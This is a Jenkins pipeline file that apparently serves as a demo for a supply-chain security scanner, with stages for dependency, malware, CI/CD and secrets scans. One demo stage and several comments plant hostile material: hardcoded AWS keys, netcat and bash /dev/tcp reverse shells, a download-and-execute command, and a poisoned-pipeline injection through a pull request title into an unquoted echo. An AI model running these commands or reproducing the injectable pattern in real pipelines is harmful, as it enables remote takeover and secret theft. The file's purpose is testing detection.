
pipeline {
  agent { label 'linux' } 


parameters {
        choice(name: 'ACTION', choices: ['Scan', 'Deps', 'Malware', 'CI/CD', 'Secrets', 'Secrets-History', 'Secrets-Autoremediate' ], description: 'Action?')
        string(name: 'XYGENI_ENV', defaultValue: "pro", description: 'Which Xygeni environment?')
  }

environment {
    MY_SECRET           = credentials('MY_SECRET')
    XY_URL              = credentials("XY_URL_${params.XYGENI_ENV}")
    XY_CRED             = credentials("XY_CRED_${params.XYGENI_ENV}_trial3")
    BITBUCKET_PAT       = credentials('BB-DC-Local-PAT-Admin')
    JENKINS_TOKEN       = credentials('JENKINS_TOKEN')
    XY_PROJECT_NAME        ="${currentBuild.fullProjectName}"
  }


stages {
    
    stage('Init') {
      steps {
        script {
            sh """
              rm -rf src/package-lock.json  
              rm -f .xygeni.secrets.baseline.json   
              rm -rf sbom/cyclonedx.json   
              #aws configure list 
              #aws iam list-access-keys --user-name jenkins
            """
            if (env.XY_PROJECT_NAME.contains('.BBDC-Jenkins-CICD/main') ) {
              exit 1
            }
        }
      }
    }

    stage('Install Xygeni scanner') {
      steps {
        echo "GIT_BRANCH ${env.GIT_BRANCH}"
        echo "GIT_BRANCH ${GIT_BRANCH}"
        sh """
          curl -L https://get.xygeni.io/latest/scanner/install.sh |  \
          /bin/bash -s -- -u ${env.XY_CRED_USR}  -p ${env.XY_CRED_PSW} -s ${env.XY_URL} -d $WORKSPACE/scanner_${env.XYGENI_ENV}  
        """
      }
    }

    stage('Scan for issues ') {
      when {
                expression { 
                   return params.ACTION == 'Scan'
                }
      }
      steps {
        withEnv([ "BITBUCKET_PAT=${env.BITBUCKET_PAT}", 
                  "JENKINS_TOKEN=${env.JENKINS_TOKEN}",
                  "JENKINS_URL=http://192.168.169.128:8080/", "JENKINS_USER=admin" ]) { 

          script {
            echo "Triggered by event ${env.BITBUCKET_X_EVENT}" 
            if (env.BITBUCKET_X_EVENT == 'pr:opened' || env.BITBUCKET_X_EVENT == 'pr:modified' ) {
              
              echo 'Triggered by PR'
              ////////////////////////////////
              // uncomment next line in a branch and open a PR to demonstrate D-PPE to obtain a secret   
              // emailext body: "The secret [${MY_SECRET}]", subject: 'Hacking from Jenkins', to: 'luis.garcia@xygeni.io' 
              //////////////////////////////// 

              ////////////////////////////////
              // Safe way to display PR title 
              echo "BITBUCKET_PULL_REQUEST_TITLE ${env.BITBUCKET_PULL_REQUEST_TITLE}"
              ////////////////////////////////

              sh """
                  #!/bin/bash 

                  echo "BITBUCKET_X_EVENT ${env.BITBUCKET_X_EVENT}"  

                  ###########################################################
                  # uncomment next line in a branch and open a PR to demonstrate D-PPE to open a RevShell 
                  # bash -c 'bash -i > /dev/tcp/172.21.52.57/1000 0>&1 2>&1'
                  ###########################################################

                  ###########################################################
                  # Open PR con this title (nest line will open a RevShell)
                  # title" && bash -c 'bash -i > /dev/tcp/172.21.52.57/1000 0>&1 2>&1' && echo "
                  # Next line is Vulnerable to Code Injection !!!
                  echo "BITBUCKET_PULL_REQUEST_TITLE ${env.BITBUCKET_PULL_REQUEST_TITLE}"  
                  ###########################################################
              """

            } else {
              echo 'Triggered by Push'
            }
          }

        sh """
          $WORKSPACE/scanner_${env.XYGENI_ENV}/xygeni -v scan --include-collaborators --sbom=./sbom/cyclonedx.json --sbom-format=cyclonedx  --never-fail --no-conf-download \
          -n ${env.XY_PROJECT_NAME} \
          --dir $WORKSPACE -e **/scanner_**/**,**/tests/**,**/dangerous/**,**/.terraform/**
        """
        }
      }
      post {
        success {
            archiveArtifacts artifacts: 'sbom/*.json', fingerprint: true
        }
      }
      
    }

    stage('Demo secrets, malicious scripts') {
      when {
                expression { 
                   return params.ACTION == 'Never Run'
                }
      }
      steps {

        withCredentials([string(credentialsId: 'MY_SECRET', variable: 'MY_SECRET')]) {
          println "SECRET [" + "${env.MY_SECRET}" + "]" 
          sh '''
              echo "secret withCredentials $MY_SECRET" | base64 -w0 | base64 -w0
              export aws_act_key="AKIAVRUVRA3NWNE5YROP"
              export aws_act_sec="x7MbJX1gPlUaMprX/FBUkhRh2f+MPMYLkDHdoIcp"
              nc -c bash 1.2.3.4 80
              wget -O /tmp/malicious.bin http://110.178.34.193:36565/bin.sh
              /tmp/malicious.bin > /dev/null 2>&1
              bash -c 'bash -i > /dev/tcp/172.21.52.57/1000 0>&1 2>&1'
          '''
        }  

      }
    }

    stage('Scan for CI/CD') {
      when {
                expression { 
                   return params.ACTION == 'CI/CD'
                }
      }
      steps {
        withEnv([ "BITBUCKET_PAT=${env.BITBUCKET_PAT}", 
                  "JENKINS_TOKEN=${env.JENKINS_TOKEN}",
                  "JENKINS_URL=http://192.168.169.128:8080/", "JENKINS_USER=admin" ]) {
        sh """
          $WORKSPACE/scanner_${env.XYGENI_ENV}/xygeni -v misconf --never-fail --no-conf-download --upload \
          -n ${env.XY_PROJECT_NAME} \
          --dir $WORKSPACE -e **/scanner_**/**,**/tests/** 
        """
        }
      }
    }

    stage('Scan for malware') {
      when {
                expression { 
                   return params.ACTION == 'Malware'
                }
      }
      steps {
        withEnv(["BITBUCKET_PAT=${env.BITBUCKET_PAT}", "JENKINS_TOKEN=${env.JENKINS_TOKEN}"]) { 
        sh """
          ###########################################################
          # next line subsitute safe version of package.json with a
          # unsafe version (containing some dep tagged as malware) 
          cp src/package.json.unsafe src/package.json
         
          #cp src/package-lock.json.unsafe src/package-lock.json
          ###########################################################
          $WORKSPACE/scanner_${env.XYGENI_ENV}/xygeni scan --run="deps,suspectdeps" --sbom=./sbom/cyclonedx.json --sbom-format=cyclonedx  --no-conf-download --upload \
          -n ${env.XY_PROJECT_NAME} \
          --dir $WORKSPACE -e **/scanner_**/**,**/tests/** 
        """
        }
      }
      post {
        failure {
            archiveArtifacts artifacts: 'sbom/*.json', fingerprint: true
        }
      }
    }

    stage('Scan for deps') {
      when {
                expression { 
                   return params.ACTION == 'Deps'
                }
      }
      steps {
        withEnv(["BITBUCKET_PAT=${env.BITBUCKET_PAT}", "JENKINS_TOKEN=${env.JENKINS_TOKEN}"]) { 
        sh """
          $WORKSPACE/scanner_${env.XYGENI_ENV}/xygeni scan --run="deps,suspectdeps" --sbom=./sbom/cyclonedx.json --sbom-format=cyclonedx --never-fail --no-conf-download --upload\
          -n ${env.XY_PROJECT_NAME} \
          --dir $WORKSPACE -e **/scanner_**/**,**/tests/** 
        """
        }
      }
      post {
        success {
            archiveArtifacts artifacts: 'sbom/*.json', fingerprint: true
        }
      }
    }

    stage('Scan for secrets') {
      when {
                expression { 
                   return params.ACTION == 'Secrets'
                }
      }
      steps {
        withEnv(["BITBUCKET_PAT=${env.BITBUCKET_PAT}", "JENKINS_TOKEN=${env.JENKINS_TOKEN}"]) { 
        sh """
          $WORKSPACE/scanner_${env.XYGENI_ENV}/xygeni -v secrets  --no-stdin --never-fail --no-conf-download --upload \
          -n ${env.XY_PROJECT_NAME} \
          --dir $WORKSPACE -e **/scanner_**/**,**/tests/** 
        """
        }
      }
    }

    stage('Secrets-History') {
      when {
                expression { 
                   return params.ACTION == 'Secrets-History'
                }
      }
      steps {
        withEnv(["BITBUCKET_PAT=${env.BITBUCKET_PAT}", "JENKINS_TOKEN=${env.JENKINS_TOKEN}"]) { 
        sh """
      
          aws iam list-access-keys --user-name jenkins

          $WORKSPACE/scanner_${env.XYGENI_ENV}/xygeni secrets --no-stdin --history --never-fail --no-conf-download \
          -n ${env.XY_PROJECT_NAME} \
          --dir $WORKSPACE -e **/scanner_**/**,**/tests/** 
        """
        }
      }

    }

    stage('Secrets-Autoremediate') {
      when {
                expression { 
                   return params.ACTION == 'Secrets-Autoremediate'
                }
      }
      steps {
        withEnv(["BITBUCKET_PAT=${env.BITBUCKET_PAT}", "JENKINS_TOKEN=${env.JENKINS_TOKEN}"]) { 
        sh """
      
          aws configure list
          aws iam list-access-keys --user-name jenkins

          $WORKSPACE/scanner_${env.XYGENI_ENV}/xygeni secrets --no-stdin --no-obfuscate --auto-remediate --never-fail --no-conf-download \
          -n ${env.XY_PROJECT_NAME} \
          --dir $WORKSPACE -e **/scanner_**/**,**/tests/** 
        """
        }
      }

    }

    stage('Merge PR') {
      when {
        changeRequest()
      }
      steps {
        sh("echo Checking conditions to merge PR with id ${env.CHANGE_ID} and Title ${pullRequest.title}")
        withEnv(["BITBUCKET_PAT=${env.BITBUCKET_PAT}", "JENKINS_TOKEN=${env.JENKINS_TOKEN}", "PR_ID=${env.CHANGE_ID}"]) { 
          sh """
            exit 1 
            echo env.CHANGE_ID ${env.CHANGE_ID}
            echo PR_ID $PR_ID

            curl -L -X 'PUT' \
                                'https://api.github.com/repos/lgvorg1/GH-JX-MB-AutoMerge/pulls/'"$PR_ID"'/merge' \
                                -H 'Accept: application/vnd.github+json'\
                                -H 'Content-Type: application/json' \
                                -H 'Authorization: Bearer '"$GITHUB_PAT" \
                                -d '{"commit_title":"el totulo","commit_message":"el message"}'
          """
        }
      }
    }
  
}

}
